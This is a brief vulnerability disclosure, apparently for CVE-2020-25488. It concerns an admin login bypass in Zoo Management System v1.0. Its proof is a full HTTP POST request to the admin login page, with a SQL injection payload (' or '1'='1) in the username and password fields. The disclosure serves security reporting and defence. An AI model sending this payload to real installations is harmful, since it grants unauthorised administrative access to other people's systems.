# CVE-2020-25488
#Login Bypass in Zoo Management System V1.0

#Vendor - https://phpgurukul.com

#Product - https://phpgurukul.com/zoo-management-system-using-php-and-mysql/

#Vulnerability Type - Incorrect Access Control

#Affected Component - Admin Login Panel ( /zms/admin/index.php )

#Attack Type- Local

#Impact Code execution - true

#Attack Vectors - Admin Login can be bypassed 

#Proof :

POST /zms/admin/index.php HTTP/1.1 Host: 192.168.1.12

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 

Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 

Accept-Language: en-US,en;q=0.5 

Accept-Encoding: gzip,deflate 

Referer:http://192.168.1.12/zms/admin/index.php

Content-Type: application/x-www-form-urlencoded

Content-Length: 78 Connection: close Cookie:

PHPSESSID=bdd3dc746e4a4dc4e8946fea7514bb54

Upgrade-Insecure-Requests: 1

username=admin%27+or+%271%27%3D%271&password=admin%27+or+%271%27%3D%271&login=
